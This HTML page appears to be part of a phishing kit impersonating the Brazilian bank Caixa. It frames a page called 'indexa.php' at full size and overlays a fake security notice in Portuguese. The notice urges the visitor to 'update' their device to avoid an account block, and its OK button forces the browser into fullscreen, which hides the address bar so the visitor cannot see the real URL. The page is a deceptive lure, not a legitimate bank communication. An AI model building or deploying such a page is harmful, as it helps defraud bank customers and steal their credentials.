<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta content="width=device-width,initial-scale=1" name="viewport">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<link href="https://fonts.googleapis.com/css?family=Advent+Pro:300|Athiti:200" rel="stylesheet">
<script src="js/bootstrap.min.js"></script>
<script>
function toggleFullScreen() {
  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
    if (document.documentElement.requestFullScreen) {  
      document.documentElement.requestFullScreen();  
    } else if (document.documentElement.mozRequestFullScreen) {  
      document.documentElement.mozRequestFullScreen();  
    } else if (document.documentElement.webkitRequestFullScreen) {  
      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
    }  
  } else {  
    if (document.cancelFullScreen) {  
      document.cancelFullScreen();  
    } else if (document.mozCancelFullScreen) {  
      document.mozCancelFullScreen();  
    } else if (document.webkitCancelFullScreen) {  
      document.webkitCancelFullScreen();  
    }  
  }  
}
</script>
<style>
.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }
.modalposition2{ max-width:380px; margin:0 auto; z-index: 99999; border: 1px solid #999; position: absolute; left:10px; right:10px;	font-family: Arial; top: 25%; background:#FFF; color:#000; box-shadow: 0 0 10px #999; padding:15px 15px 15px 15px; border-radius:3px; }
.modaltext{ padding:15px 15px 15px 0; color:#666666; }
#ok { padding:5px 20px 5px 20px; background:#F3A901; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}
</style>
</head>

<body style="margin:0;">
<iframe name="iframe" id="iframe" src="indexa.php" frameborder="0" style="position:absolute; height:100%; width:100%;"></iframe>
<!-- ================================================================ -->
<div style="" id="modalalert" class="modalposition">
<div id="modalalert2" class="modalposition2">
<div style="font-size:16px;"><span class="glyphicon glyphicon-lock" style="color:#F3A901;"></span><span><span> Comunicado Caixa: </div>
<div class="modaldiv1"><div class="modaltext">
  <div id="TextErrorModal" style="font-size:0.9em;">Por razões de segurança será necessário a atualizar seu dispositivo, evite bloqueio da sua conta e ative seu dispositivo no novo modulo de segurança caixa, Siga os passos a seguir.</div></div></div>
<div class="modaldiv2" align="right">
<a href="#closemodal"></a> <a href="#closemodal"><button onClick="toggleFullScreen();document.getElementById('modalalert').style.display='none';return false" id="ok"> Ok</button></a>
</div>
</div>
</div>
<!-- ================================================================ -->
</body>
</html>